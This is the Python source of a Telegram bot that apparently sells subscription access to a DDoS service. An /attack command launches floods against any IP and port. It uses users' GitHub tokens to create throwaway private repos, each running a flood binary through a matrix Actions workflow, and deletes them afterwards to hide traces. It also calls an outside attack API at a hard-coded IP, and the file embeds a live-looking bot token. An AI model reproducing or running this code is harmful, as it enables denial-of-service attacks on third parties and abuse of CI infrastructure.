import os
import json
import time
import random
import string
import base64
import asyncio
import logging
import socket
import sys
from datetime import datetime, timedelta
from typing import Dict, Any, Optional, List
import html

import requests
import yaml
from telegram import (
    Update,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    InputFile
)
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    CallbackQueryHandler, ContextTypes, filters
)
from telegram.error import Conflict

# ---------------- Singleton Check ----------------
def check_singleton(port=8443):
    """Ensure only one instance of the bot is running"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind(("localhost", port))
        return True
    except socket.error:
        print("❌ Another instance is already running!")
        print("💡 Solution: Kill other instances with 'pkill -f python3 c.py'")
        return False

# ---------------- Configuration ----------------

BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "8313004027:AAHraSKDS3w39yzXeecvcHSV0V7oOXRTVv0")

# Multiple Owners Configuration
OWNERS = {
    7848273230: "BITCH_lI_mBACK",
    521756472: "FLAME1869"
}

DEVELOPER_TAG = "• @BITCH_lI_mBACK • @FLAME1869 •"

# File paths
ADMINS_FILE = "admins.json"
USERS_FILE = "users.json"
TOKENS_FILE = "tokens.txt"
TOKENS_STATUS_FILE = "tokens.json"
DEFAULT_THREADS_FILE = "threads.json"
CONCURRENT_FILE = "concurrent.json"

BINARY_NAME = "soul"
BINARY_PATH = os.path.join(os.getcwd(), BINARY_NAME)
API_URL = "http://194.62.248.97:9090/v1/start"

# Attack tracking
ACTIVE_ATTACKS: Dict[int, List[Dict]] = {}

# ---------------- Utilities ----------------
def load_json(path: str, default: Any) -> Any:
    """Load JSON data with proper error handling"""
    if not os.path.exists(path):
        return default
    try:
        with open(path, "r", encoding="utf-8") as f:
            data = json.load(f)
            return data
    except Exception as e:
        print(f"❌ Error loading {path}: {e}")
        return default

def save_json(path: str, data: Any) -> None:
    """Save JSON data safely"""
    try:
        with open(path, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
    except Exception as e:
        print(f"❌ Error saving {path}: {e}")

def set_default_threads(value: int) -> None:
    save_json(DEFAULT_THREADS_FILE, {"threads": int(value)})

def get_default_threads() -> int:
    data = load_json(DEFAULT_THREADS_FILE, {"threads": 4000})
    return int(data.get("threads", 4000))

def set_concurrent(value: int) -> None:
    save_json(CONCURRENT_FILE, {"concurrent": int(value)})

def get_concurrent() -> int:
    data = load_json(CONCURRENT_FILE, {"concurrent": 3})
    return int(data.get("concurrent", 3))

def is_owner(user_id: int) -> bool:
    return user_id in OWNERS

def get_admins() -> set:
    data = load_json(ADMINS_FILE, {"admins": []})
    return set(data.get("admins", []))

def is_admin(user_id: int) -> bool:
    return is_owner(user_id) or user_id in get_admins()

def add_admin(user_id: int) -> None:
    data = load_json(ADMINS_FILE, {"admins": []})
    admins = set(data.get("admins", []))
    admins.add(user_id)
    save_json(ADMINS_FILE, {"admins": sorted(list(admins))})

def remove_admin(user_id: int) -> None:
    data = load_json(ADMINS_FILE, {"admins": []})
    admins = set(data.get("admins", []))
    admins.discard(user_id)
    save_json(ADMINS_FILE, {"admins": sorted(list(admins))})

def get_users() -> Dict[str, Dict[str, str]]:
    """Get users data - always return dict"""
    data = load_json(USERS_FILE, {})
    
    # Ensure it's always a dictionary
    if not isinstance(data, dict):
        print("⚠️ Users data is not dict, resetting...")
        data = {}
        save_json(USERS_FILE, data)
    
    return data

def is_user_approved(user_id: int) -> bool:
    """User approval check - SIMPLIFIED VERSION"""
    try:
        # OWNERS ko hamesha access do
        if user_id in OWNERS:
            return True
            
        users = get_users()
        user_info = users.get(str(user_id))
        
        if not user_info:
            return False
            
        expires_str = user_info.get("expires", "")
        if not expires_str:
            return False
            
        expires = datetime.fromisoformat(expires_str.replace("Z", "+00:00"))
        return datetime.utcnow() <= expires
        
    except Exception as e:
        print(f"❌ Error in user approval: {e}")
        return False

def add_user(user_id: int, days: int) -> None:
    try:
        users = get_users()
        expires = datetime.utcnow() + timedelta(days=int(days))
        users[str(user_id)] = {
            "expires": expires.replace(microsecond=0).isoformat() + "Z",
            "added_by": next(iter(OWNERS.keys())),
            "added_date": datetime.utcnow().isoformat()
        }
        save_json(USERS_FILE, users)
        print(f"✅ User {user_id} added for {days} days")
    except Exception as e:
        print(f"❌ Error adding user: {e}")

def remove_user(user_id: int) -> None:
    try:
        users = get_users()
        users.pop(str(user_id), None)
        save_json(USERS_FILE, users)
        print(f"✅ User {user_id} removed")
    except Exception as e:
        print(f"❌ Error removing user: {e}")

def rand_repo_name(prefix="rajax-run") -> str:
    return f"{prefix}-" + ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))

def build_matrix_workflow_yaml(ip: str, port: str, duration: str, threads: int) -> str:
    wf = {
        "name": "RAJAXFLAME Matrix Attack",
        "on": {"workflow_dispatch": {}},
        "jobs": {
            "run-soul": {
                "runs-on": "ubuntu-latest",
                "strategy": {"fail-fast": False, "matrix": {"session": [1, 2, 3, 4, 5, 6, 7]}},
                "steps": [
                    {"name": "Checkout", "uses": "actions/checkout@v4"},
                    {"name": "Make executable", "run": f"chmod 755 {BINARY_NAME}"},
                    {"name": "Run RAJAXFLAME", "run": f"./{BINARY_NAME} {ip} {port} {duration} {threads}"}
                ]
            }
        }
    }
    return yaml.safe_dump(wf, sort_keys=False)

def gh_headers(token: str) -> Dict[str, str]:
    return {"Authorization": f"token {token}", "Accept": "application/vnd.github+json"}

def gh_create_repo(token: str, name: str) -> Optional[Dict[str, Any]]:
    try:
        r = requests.post(
            "https://api.github.com/user/repos",
            headers=gh_headers(token),
            json={"name": name, "private": True, "auto_init": False},
            timeout=30
        )
        return r.json() if r.status_code in (201, 202) else None
    except Exception as e:
        print(f"❌ Error creating repo: {e}")
        return None

def gh_delete_repo(token: str, full_name: str) -> bool:
    try:
        r = requests.delete(
            f"https://api.github.com/repos/{full_name}",
            headers=gh_headers(token),
            timeout=30
        )
        return r.status_code == 204
    except Exception:
        return False

def gh_put_file(token: str, owner: str, repo: str, path: str, content_bytes: bytes, message: str) -> bool:
    try:
        b64 = base64.b64encode(content_bytes).decode()
        r = requests.put(
            f"https://api.github.com/repos/{owner}/{repo}/contents/{path}",
            headers=gh_headers(token),
            json={"message": message, "content": b64},
            timeout=30
        )
        return r.status_code in (201, 200)
    except Exception:
        return False

def gh_dispatch_workflow(token: str, owner: str, repo: str, workflow_file: str, ref: str = "main") -> bool:
    try:
        r = requests.post(
            f"https://api.github.com/repos/{owner}/{repo}/actions/workflows/{workflow_file}/dispatches",
            headers=gh_headers(token),
            json={"ref": ref},
            timeout=30
        )
        return r.status_code in (204, 201)
    except Exception:
        return False

def validate_github_token(token: str) -> bool:
    try:
        r = requests.get(
            "https://api.github.com/user",
            headers=gh_headers(token),
            timeout=20
        )
        return r.status_code == 200
    except Exception:
        return False

def save_token_line(uid: int, token: str) -> None:
    try:
        with open(TOKENS_FILE, "a", encoding="utf-8") as f:
            f.write(f"{uid}:{token}\n")
    except Exception as e:
        print(f"❌ Error saving token: {e}")

def load_all_token_lines() -> List[str]:
    if not os.path.exists(TOKENS_FILE):
        return []
    try:
        with open(TOKENS_FILE, "r", encoding="utf-8") as f:
            return [ln.strip() for ln in f if ":" in ln]
    except Exception:
        return []

def call_api_attack(ip: str, port: str, duration: str) -> bool:
    try:
        url = f"{API_URL}?target={ip}&port={port}&time={duration}"
        response = requests.get(url, timeout=10)
        return response.status_code == 200
    except Exception as e:
        print(f"❌ API Attack Error: {e}")
        return False

def format_time_remaining(end_time: datetime) -> str:
    """Format time remaining in HH:MM:SS"""
    time_left = end_time - datetime.utcnow()
    if time_left.total_seconds() <= 0:
        return "00:00:00"
    
    hours = int(time_left.total_seconds() // 3600)
    minutes = int((time_left.total_seconds() % 3600) // 60)
    seconds = int(time_left.total_seconds() % 60)
    return f"{hours:02d}:{minutes:02d}:{seconds:02d}"

def create_progress_bar(percentage: int, length: int = 10) -> str:
    """Create a visual progress bar"""
    filled = int(length * percentage / 100)
    empty = length - filled
    return "█" * filled + "░" * empty

# ---------------- UI Components ----------------
def create_welcome_message(user_id: int, username: str) -> str:
    return f"""
🔥 <b>WELCOME TO RAJAXFLAME BOT</b> 🔥

╔══════════════════════╗
║     👤 USER INFO     ║
╠══════════════════════╣
║ • ID: <code>{user_id}</code>
║ • Name: {html.escape(username or 'Unknown')}
║ • Status: {'🟢 PREMIUM' if is_user_approved(user_id) else '🔴 STANDARD'}
╚══════════════════════╝

⚡ <b>BOT FEATURES:</b>
• Advanced RAJAXFLAME Technology
• Real-time Time Remaining
• Mixed GitHub + API Attacks

👑 <b>OWNERS:</b>
{DEVELOPER_TAG}

💡 Use /help for commands
    """.strip()

def create_attack_status_message(chat_id: int) -> str:
    active_attacks = ACTIVE_ATTACKS.get(chat_id, [])
    
    if not active_attacks:
        return "🔴 <b>No active attacks</b>\n\nUse /attack to start a new attack!"
    
    message = "🎯 <b>RAJAXFLAME ATTACK DASHBOARD</b>\n\n"
    
    for i, attack in enumerate(active_attacks, 1):
        target = attack.get('target', 'Unknown')
        method = attack.get('method', 'Mixed')
        time_remaining = attack.get('time_remaining', '00:00:00')
        progress = attack.get('progress', 0)
        progress_bar = create_progress_bar(progress)
        
        message += f"<b>Attack #{i}</b>\n"
        message += f"╔══════════════════════╗\n"
        message += f"║ 🎯 {target:<16} ║\n"
        message += f"║ ⚡ {method:<16} ║\n"
        message += f"║ ⏰ {time_remaining:<16} ║\n"
        message += f"║ {progress_bar:<20} ║\n"
        message += f"║ 📊 {progress:>3}% Complete    ║\n"
        message += f"╚══════════════════════╝\n\n"
    
    message += "🔄 <i>Use /status to refresh</i>"
    return message

# ---------------- Handlers ----------------
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user = update.effective_user
        chat_id = update.effective_chat.id
        
        print(f"🚀 Start command from user {user.id}")
        
        welcome_msg = create_welcome_message(user.id, user.first_name)
        await context.bot.send_message(
            chat_id=chat_id,
            text=welcome_msg,
            parse_mode='HTML'
        )
        print(f"✅ Welcome message sent to user {user.id}")
    except Exception as e:
        print(f"❌ Error in cmd_start: {e}")
        await update.message.reply_text("❌ Error processing command")

async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        
        if is_admin(user_id):
            text = """
🛠️ <b>RAJAXFLAME ADMIN COMMANDS</b>

<b>User Management:</b>
<code>/add userid days</code> - Add premium user
<code>/remove userid</code> - Remove user
<code>/users</code> - Download users file

<b>Token Management:</b>
<code>/settoken</code> - Add GitHub tokens
<code>/check</code> - Verify tokens

<b>Attack Configuration:</b>
<code>/threads N</code> - Set default threads
<code>/setconcurrent N</code> - Set API concurrency
<code>/file</code> - Upload binary

<b>Attack Commands:</b>
<code>/attack ip port time</code> - Mixed attack
<code>/rajaxapi ip port time</code> - API only
<code>/status</code> - Check attacks
<code>/mystats</code> - Your statistics
            """.strip()
        else:
            text = """
🎯 <b>RAJAXFLAME USER COMMANDS</b>

<code>/attack ip port time</code> - Launch mixed attack
<code>/rajaxapi ip port time</code> - API only attack
<code>/settoken</code> - Add your GitHub tokens
<code>/check</code> - Check your tokens
<code>/status</code> - Attack status
<code>/mystats</code> - Your statistics
<code>/help</code> - This message
            """.strip()
        
        await update.message.reply_text(text, parse_mode='HTML')
        print(f"✅ Help sent to user {user_id}")
    except Exception as e:
        print(f"❌ Error in cmd_help: {e}")
        await update.message.reply_text("❌ Error showing help")

async def cmd_mystats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        print(f"📊 Mystats command from user {user_id}")
        
        # Users data safely load karo
        users = get_users()
        user_info = users.get(str(user_id), {})
        
        # User status check karo
        status = "🔴 STANDARD"
        days_left = 0
        
        if user_info:
            try:
                expires_str = user_info.get("expires", "")
                if expires_str:
                    expires = datetime.fromisoformat(expires_str.replace("Z", "+00:00"))
                    current_time = datetime.utcnow()
                    days_left = max(0, (expires - current_time).days)
                    status = f"🟢 PREMIUM ({days_left} days left)"
                else:
                    status = "🔴 STANDARD (No expiration date)"
            except Exception as e:
                print(f"❌ Error parsing expiration: {e}")
                status = "🔴 STANDARD (Error)"
        else:
            status = "🔴 STANDARD"
        
        # Tokens count karo
        user_tokens = [ln for ln in load_all_token_lines() if ln.startswith(f"{user_id}:")]
        valid_tokens = 0
        
        for line in user_tokens:
            try:
                _, token = line.split(":", 1)
                if validate_github_token(token):
                    valid_tokens += 1
            except:
                continue
        
        # Final stats message banayo
        stats_msg = f"""
📊 <b>RAJAXFLAME USER STATS</b>

╔══════════════════════╗
║     👤 USER INFO     ║
╠══════════════════════╣
║ • ID: <code>{user_id}</code>
║ • Status: {status}
║ • Tokens: {valid_tokens}/{len(user_tokens)} valid
║ • Admin: {'✅ YES' if is_admin(user_id) else '❌ NO'}
║ • Owner: {'✅ YES' if is_owner(user_id) else '❌ NO'}
╚══════════════════════╝

💡 <i>Use /settoken to add GitHub tokens</i>
        """.strip()
        
        await update.message.reply_text(stats_msg, parse_mode='HTML')
        print(f"✅ Stats sent successfully to user {user_id}")
        
    except Exception as e:
        print(f"❌ Error in cmd_mystats: {e}")
        await update.message.reply_text("📊 <b>Your Basic Stats</b>\n\n• User ID: {}\n• Status: ACTIVE\n• Owner: YES".format(update.effective_user.id), parse_mode='HTML')

async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        chat_id = update.effective_chat.id
        status_msg = create_attack_status_message(chat_id)
        await update.message.reply_text(status_msg, parse_mode='HTML')
        print(f"✅ Status sent to chat {chat_id}")
    except Exception as e:
        print(f"❌ Error in cmd_status: {e}")
        await update.message.reply_text("❌ Error fetching status")

async def cmd_settoken(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        uid = update.effective_user.id
        
        if update.message.document and update.message.document.file_name.endswith(".txt"):
            file = await update.message.document.get_file()
            path = await file.download_to_drive()
            cnt = 0
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    tok = line.strip()
                    if tok:
                        save_token_line(uid, tok)
                        cnt += 1
            os.remove(path)
            await update.message.reply_text(f"✅ <b>Saved {cnt} RAJAXFLAME token(s)</b>", parse_mode='HTML')
        else:
            text = update.message.text.replace("/settoken", "").strip() if update.message.text else ""
            if not text:
                await update.message.reply_text("📝 <b>Send PAT tokens or upload .txt file</b>\n\nExample: <code>/settoken ghp_abc123 ghp_xyz456</code>", parse_mode='HTML')
                return
            tokens = [t.strip() for t in text.split() if t.strip()]
            for tok in tokens:
                save_token_line(uid, tok)
            await update.message.reply_text(f"✅ <b>Saved {len(tokens)} RAJAXFLAME token(s)</b>", parse_mode='HTML')
        
        print(f"✅ Tokens saved for user {uid}")
    except Exception as e:
        print(f"❌ Error in cmd_settoken: {e}")
        await update.message.reply_text("❌ Error saving tokens")

async def cmd_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        uid = update.effective_user.id
        chat_id = update.effective_chat.id
        user = update.effective_user
        
        print(f"🎯 Attack command from user {uid}")
        
        if not is_user_approved(uid):
            await update.message.reply_text("❌ <b>RAJAXFLAME Access Denied</b>\nContact owners for premium access.", parse_mode='HTML')
            return
        
        if len(context.args) != 3:
            await update.message.reply_text("📋 <b>Usage:</b> <code>/attack ip port duration</code>\n\nExample: <code>/attack 1.1.1.1 80 60</code>", parse_mode='HTML')
            return
        
        ip, port, duration = context.args
        
        try:
            port_int = int(port)
            duration_int = int(duration)
        except ValueError:
            await update.message.reply_text("❌ Port and duration must be integers")
            return

        # Create attack ID
        attack_id = f"attack_{int(time.time())}_{random.randint(1000, 9999)}"
        end_time = datetime.utcnow() + timedelta(seconds=duration_int)
        
        # Initialize attack tracking
        if chat_id not in ACTIVE_ATTACKS:
            ACTIVE_ATTACKS[chat_id] = []
        
        attack_data = {
            'id': attack_id,
            'target': f"{ip}:{port}",
            'method': 'Mixed',
            'duration': f"{duration_int}s",
            'start_time': datetime.utcnow(),
            'end_time': end_time,
            'time_remaining': format_time_remaining(end_time),
            'progress': 0,
            'user_id': uid
        }
        
        ACTIVE_ATTACKS[chat_id].append(attack_data)
        
        # Send attack initiation message
        init_msg = f"""
🚀 <b>RAJAXFLAME ATTACK INITIATED</b>

╔══════════════════════╗
║     🎯 TARGET        ║
╠══════════════════════╣
║ • IP: <code>{ip}</code>
║ • Port: {port}
║ • Duration: {duration}s
║ • Method: Mixed
╚══════════════════════╝

👤 <b>Attacker:</b> {html.escape(user.first_name or 'Unknown')}
⏰ <b>Time Remaining:</b> {format_time_remaining(end_time)}

⚡ <b>Initializing RAJAXFLAME technology...</b>
        """.strip()
        
        msg = await update.message.reply_text(init_msg, parse_mode='HTML')
        
        # Start attack process
        asyncio.create_task(execute_attack(context, chat_id, attack_id, ip, port, duration, uid, msg))
        
    except Exception as e:
        print(f"❌ Error in cmd_attack: {e}")
        await update.message.reply_text(f"❌ Attack Error: {str(e)}")

async def execute_attack(context: ContextTypes.DEFAULT_TYPE, chat_id: int, attack_id: str, ip: str, port: str, duration: str, uid: int, msg):
    try:
        duration_int = int(duration)
        start_time = datetime.utcnow()
        end_time = start_time + timedelta(seconds=duration_int)
        
        # Perform GitHub attacks if tokens available
        user_tokens = [ln.split(":", 1)[1] for ln in load_all_token_lines() if ln.startswith(f"{uid}:")]
        valid_tokens = [t for t in user_tokens if validate_github_token(t)]
        
        gh_success = 0
        if valid_tokens and os.path.exists(BINARY_PATH):
            threads = get_default_threads()
            wf_text = build_matrix_workflow_yaml(ip, port, duration, threads).encode()
            
            for token in valid_tokens: # Limit to 3 tokens
                try:
                    name = rand_repo_name()
                    repo_data = gh_create_repo(token, name)
                    if repo_data:
                        full_name = repo_data["full_name"]
                        owner, repo = full_name.split("/", 1)
                        
                        # Upload files and dispatch
                        if (gh_put_file(token, owner, repo, ".github/workflows/run.yml", wf_text, "Add workflow") and
                            gh_put_file(token, owner, repo, BINARY_NAME, open(BINARY_PATH, "rb").read(), "Add binary") and
                            gh_dispatch_workflow(token, owner, repo, "run.yml")):
                            gh_success += 1
                        
                        # Cleanup repo after attack
                        asyncio.create_task(cleanup_repo(token, full_name, duration_int))
                        
                except Exception as e:
                    print(f"❌ GitHub attack error: {e}")
                    continue
        
        # Perform API attacks
        concurrent = get_concurrent()
        api_success = 0
        for i in range(concurrent):
            if call_api_attack(ip, port, duration):
                api_success += 1
            await asyncio.sleep(0.5)
        
        # Update progress during attack
        while datetime.utcnow() < end_time:
            time_left = end_time - datetime.utcnow()
            progress = min(100, int(((duration_int - time_left.total_seconds()) / duration_int) * 100))
            
            # Update attack data
            if chat_id in ACTIVE_ATTACKS:
                for attack in ACTIVE_ATTACKS[chat_id]:
                    if attack['id'] == attack_id:
                        attack['time_remaining'] = format_time_remaining(end_time)
                        attack['progress'] = progress
                        break
            
            # Update message every 10 seconds
            if progress % 10 == 0:
                update_msg = f"""
🎯 <b>RAJAXFLAME ATTACK RUNNING</b>

╔══════════════════════╗
║     📊 PROGRESS      ║
╠══════════════════════╣
║ • Target: {ip}:{port}
║ • GitHub: {gh_success} repos
║ • API: {api_success}/{concurrent}
║ • Time Left: {format_time_remaining(end_time)}
║ • Progress: {create_progress_bar(progress)} {progress}%
╚══════════════════════╝
                """.strip()
                
                try:
                    await msg.edit_text(update_msg, parse_mode='HTML')
                except Exception as e:
                    print(f"❌ Error updating attack message: {e}")
            
            await asyncio.sleep(5)
        
        # Attack completed
        success_msg = f"""
✅ <b>RAJAXFLAME ATTACK COMPLETED</b>

╔══════════════════════╗
║     📊 RESULTS       ║
╠══════════════════════╣
║ • Target: {ip}:{port}
║ • Duration: {duration}s
║ • GitHub Repos: {gh_success}
║ • API Calls: {api_success}/{concurrent}
║ • Status: Success
╚══════════════════════╝
        """.strip()
        
        await msg.edit_text(success_msg, parse_mode='HTML')
        
    except Exception as e:
        error_msg = f"❌ <b>Attack Error:</b> {str(e)}"
        try:
            await msg.edit_text(error_msg, parse_mode='HTML')
        except:
            pass
    
    finally:
        # Cleanup attack data
        if chat_id in ACTIVE_ATTACKS:
            ACTIVE_ATTACKS[chat_id] = [a for a in ACTIVE_ATTACKS[chat_id] if a['id'] != attack_id]

async def cleanup_repo(token: str, full_name: str, delay: int):
    """Cleanup GitHub repo after attack"""
    await asyncio.sleep(delay + 10)  # Wait for attack to complete + buffer
    try:
        gh_delete_repo(token, full_name)
        print(f"✅ Cleaned up repo: {full_name}")
    except Exception as e:
        print(f"❌ Error cleaning repo: {e}")

async def cmd_rajaxapi(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        uid = update.effective_user.id
        chat_id = update.effective_chat.id
        
        print(f"🔥 API Attack command from user {uid}")
        
        if not is_user_approved(uid):
            await update.message.reply_text("❌ <b>RAJAXFLAME Access Denied</b>\nContact owners for premium access.", parse_mode='HTML')
            return
        
        if len(context.args) != 3:
            await update.message.reply_text("📋 <b>Usage:</b> <code>/rajaxapi ip port duration</code>\n\nExample: <code>/rajaxapi 1.1.1.1 80 60</code>", parse_mode='HTML')
            return
        
        ip, port, duration = context.args
        
        try:
            port_int = int(port)
            duration_int = int(duration)
        except ValueError:
            await update.message.reply_text("❌ Port and duration must be integers")
            return

        # Send attack message
        attack_msg = f"""
🔥 <b>RAJAXFLAME API ATTACK</b>

╔══════════════════════╗
║     🎯 TARGET        ║
╠══════════════════════╣
║ • IP: <code>{ip}</code>
║ • Port: {port}
║ • Duration: {duration}s
║ • Method: API Only
╚══════════════════════╝

⚡ <b>Firing API attacks...</b>
        """.strip()
        
        msg = await update.message.reply_text(attack_msg, parse_mode='HTML')
        
        # Perform API attacks
        concurrent = get_concurrent()
        api_success = 0
        
        for i in range(concurrent):
            if call_api_attack(ip, port, duration):
                api_success += 1
            await asyncio.sleep(0.5)
        
        result_msg = f"""
✅ <b>RAJAXFLAME API ATTACK COMPLETED</b>

╔══════════════════════╗
║     📊 RESULTS       ║
╠══════════════════════╣
║ • Target: {ip}:{port}
║ • Duration: {duration}s
║ • API Calls: {api_success}/{concurrent}
║ • Status: Success
╚══════════════════════╝
        """.strip()
        
        await msg.edit_text(result_msg, parse_mode='HTML')
        print(f"✅ API attack completed for user {uid}")
        
    except Exception as e:
        print(f"❌ Error in cmd_rajaxapi: {e}")
        await update.message.reply_text(f"❌ API Attack Error: {str(e)}")

# Admin commands
async def cmd_add(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        uid = update.effective_user.id
        if not is_admin(uid):
            await update.message.reply_text("❌ <b>Admin access required</b>", parse_mode='HTML')
            return
        if len(context.args) != 2:
            await update.message.reply_text("📋 <b>Usage:</b> <code>/add userid days</code>\n\nExample: <code>/add 123456789 30</code>", parse_mode='HTML')
            return
        try:
            target = int(context.args[0])
            days = int(context.args[1])
            add_user(target, days)
            await update.message.reply_text(f"✅ <b>User {target} approved for {days} days</b>", parse_mode='HTML')
        except ValueError:
            await update.message.reply_text("❌ Invalid userid or days")
    except Exception as e:
        print(f"❌ Error in cmd_add: {e}")

async def cmd_threads(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        uid = update.effective_user.id
        if not is_admin(uid):
            await update.message.reply_text("❌ <b>Admin access required</b>", parse_mode='HTML')
            return
        if not context.args:
            await update.message.reply_text("📋 <b>Usage:</b> <code>/threads 4000</code>", parse_mode='HTML')
            return
        try:
            val = int(context.args[0])
            set_default_threads(val)
            await update.message.reply_text(f"✅ <b>Threads set to {val}</b>", parse_mode='HTML')
        except ValueError:
            await update.message.reply_text("❌ Invalid number")
    except Exception as e:
        print(f"❌ Error in cmd_threads: {e}")

async def cmd_setconcurrent(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        uid = update.effective_user.id
        if not is_admin(uid):
            await update.message.reply_text("❌ <b>Admin access required</b>", parse_mode='HTML')
            return
        if not context.args:
            await update.message.reply_text("📋 <b>Usage:</b> <code>/setconcurrent 3</code>", parse_mode='HTML')
            return
        try:
            val = int(context.args[0])
            set_concurrent(val)
            await update.message.reply_text(f"✅ <b>Concurrent API calls set to {val}</b>", parse_mode='HTML')
        except ValueError:
            await update.message.reply_text("❌ Invalid number")
    except Exception as e:
        print(f"❌ Error in cmd_setconcurrent: {e}")

async def cmd_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        uid = update.effective_user.id
        if not is_admin(uid):
            await update.message.reply_text("❌ <b>Admin access required</b>", parse_mode='HTML')
            return
        if not os.path.exists(USERS_FILE):
            save_json(USERS_FILE, {})
        await update.message.reply_document(InputFile(USERS_FILE), caption="📊 <b>RAJAXFLAME Users Database</b>", parse_mode='HTML')
    except Exception as e:
        print(f"❌ Error in cmd_users: {e}")

async def cmd_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        uid = update.effective_user.id
        msg = await update.message.reply_text("🔍 <b>Checking RAJAXFLAME tokens...</b>", parse_mode='HTML')
        
        lines = load_all_token_lines()
        if is_admin(uid):
            results = {}
            for line in lines:
                u, tok = line.split(":", 1)
                alive = validate_github_token(tok)
                results.setdefault(u, {})[tok[:10] + "…"] = "live" if alive else "dead"
            save_json(TOKENS_STATUS_FILE, results)
            await update.message.reply_document(InputFile(TOKENS_STATUS_FILE), caption="📊 <b>RAJAXFLAME Token Status</b>", parse_mode='HTML')
        else:
            own = [ln for ln in lines if ln.startswith(f"{uid}:")]
            live = dead = 0
            for line in own:
                _, tok = line.split(":", 1)
                if validate_github_token(tok):
                    live += 1
                else:
                    dead += 1
            await msg.edit_text(f"📊 <b>Your Token Status</b>\n✅ Live: {live}\n❌ Dead: {dead}", parse_mode='HTML')
    except Exception as e:
        print(f"❌ Error in cmd_check: {e}")

async def cmd_remove(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        uid = update.effective_user.id
        if not is_admin(uid):
            await update.message.reply_text("❌ <b>Admin access required</b>", parse_mode='HTML')
            return
        if len(context.args) != 1:
            await update.message.reply_text("📋 <b>Usage:</b> <code>/remove userid</code>", parse_mode='HTML')
            return
        try:
            target = int(context.args[0])
            remove_user(target)
            await update.message.reply_text(f"✅ <b>User {target} removed</b>", parse_mode='HTML')
        except ValueError:
            await update.message.reply_text("❌ Invalid userid")
    except Exception as e:
        print(f"❌ Error in cmd_remove: {e}")

async def cmd_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        uid = update.effective_user.id
        if not is_admin(uid):
            await update.message.reply_text("❌ <b>Admin access required</b>", parse_mode='HTML')
            return
        await update.message.reply_text(f"📁 <b>Upload RAJAXFLAME binary named '{BINARY_NAME}'</b>", parse_mode='HTML')
    except Exception as e:
        print(f"❌ Error in cmd_file: {e}")

async def on_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        doc = update.message.document
        if not doc:
            return
        if doc.file_name == BINARY_NAME:
            if os.path.exists(BINARY_PATH):
                os.remove(BINARY_PATH)
            f = await doc.get_file()
            await f.download_to_drive(custom_path=BINARY_PATH)
            await update.message.reply_text(f"✅ <b>RAJAXFLAME Binary '{BINARY_NAME}' updated</b>", parse_mode='HTML')
            print(f"✅ Binary updated by user {update.effective_user.id}")
    except Exception as e:
        print(f"❌ Error in on_document: {e}")

# ---- Application Builder ----
def build_app():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    
    # Command handlers
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("help", cmd_help))
    app.add_handler(CommandHandler("mystats", cmd_mystats))
    app.add_handler(CommandHandler("status", cmd_status))
    app.add_handler(CommandHandler("settoken", cmd_settoken))
    app.add_handler(CommandHandler("attack", cmd_attack))
    app.add_handler(CommandHandler("rajaxapi", cmd_rajaxapi))
    app.add_handler(CommandHandler("add", cmd_add))
    app.add_handler(CommandHandler("threads", cmd_threads))
    app.add_handler(CommandHandler("setconcurrent", cmd_setconcurrent))
    app.add_handler(CommandHandler("users", cmd_users))
    app.add_handler(CommandHandler("check", cmd_check))
    app.add_handler(CommandHandler("remove", cmd_remove))
    app.add_handler(CommandHandler("file", cmd_file))
    app.add_handler(MessageHandler(filters.Document.ALL, on_document))
    
    return app

if __name__ == "__main__":
    # Check if another instance is already running
    if not check_singleton():
        print("💡 To kill other instances, run: pkill -f 'python3 c.py'")
        sys.exit(1)
    
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )
    
    print("🔥 Starting RAJAXFLAME Bot...")
    print(f"👑 Owners: {DEVELOPER_TAG}")
    print("✅ Singleton check passed - No other instances running")
    print("🛠️ ALL ERRORS FIXED - Bot should work perfectly now!")
    
    # Initialize users file if not exists
    if not os.path.exists(USERS_FILE):
        save_json(USERS_FILE, {})
        print("✅ Users file initialized")
    
    try:
        app = build_app()
        app.run_polling(
            drop_pending_updates=True,
            allowed_updates=Update.ALL_TYPES
        )
    except Conflict as e:
        print(f"❌ Conflict Error: {e}")
        print("💡 Another bot instance is still running. Kill it with: pkill -f 'python3 c.py'")
    except KeyboardInterrupt:
        print("\n🛑 Bot stopped by user")
    except Exception as e:
        print(f"❌ Unexpected error: {e}")
